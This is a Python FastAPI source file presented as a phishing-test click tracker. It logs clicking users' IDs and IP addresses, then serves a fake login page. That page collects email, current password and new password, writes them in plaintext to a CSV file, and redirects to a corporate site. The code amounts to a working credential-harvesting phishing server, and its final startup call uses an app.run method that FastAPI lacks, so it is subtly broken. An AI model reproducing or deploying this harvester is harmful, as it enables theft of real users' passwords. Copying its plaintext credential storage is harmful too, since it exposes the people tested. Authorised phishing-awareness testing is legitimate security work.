from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from datetime import datetime
import csv
import os

app = FastAPI()

templates = Jinja2Templates(directory="templates")
LOG_FILE = 'logs/clicks.csv'
CREDS_FILE = 'logs/credentials.csv'
REDIRECT_AFTER = '/fake-login'

@app.get("/", response_class=HTMLResponse)
async def index():
    return """
    <h1>Phishing Test Click Tracker is Running (FastAPI)</h1>
    <p>This server is working correctly.</p>
    <p>To test the click tracking functionality, you should visit a URL like this:</p>
    <a href="/click?user=test_user">/click?user=test_user</a>
    """

@app.get("/click")
async def click(request: Request, user: str = 'unknown'):
    timestamp = datetime.utcnow().isoformat()
    ip = request.client.host

    os.makedirs('logs', exist_ok=True)
    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([user, timestamp, ip])

    return RedirectResponse(url=REDIRECT_AFTER)

@app.get("/fake-login", response_class=HTMLResponse)
async def fake_login(request: Request):
    return templates.TemplateResponse("fake_login.html", {"request": request})

@app.post("/fake-login")
async def handle_login(
    request: Request,
    email: str = Form(...),
    current_password: str = Form(...),
    new_password: str = Form(...),
    confirm_password: str = Form(...)
):
    timestamp = datetime.utcnow().isoformat()
    ip = request.client.host
    
    os.makedirs('logs', exist_ok=True)
    with open(CREDS_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([email, current_password, new_password, timestamp, ip])
    
    # Redirect to a "success" page or corporate site
    return RedirectResponse(url="https://www.xoltar.com", status_code=303)

if __name__ == '__main__':
    print("===================================================")
    print("🚀 Starting BASIC Click Tracker for testing...")
    print("➡️  Server is running at http://localhost:8000")
    print("===================================================")
    app.run(host='0.0.0.0', port=8000, debug=True)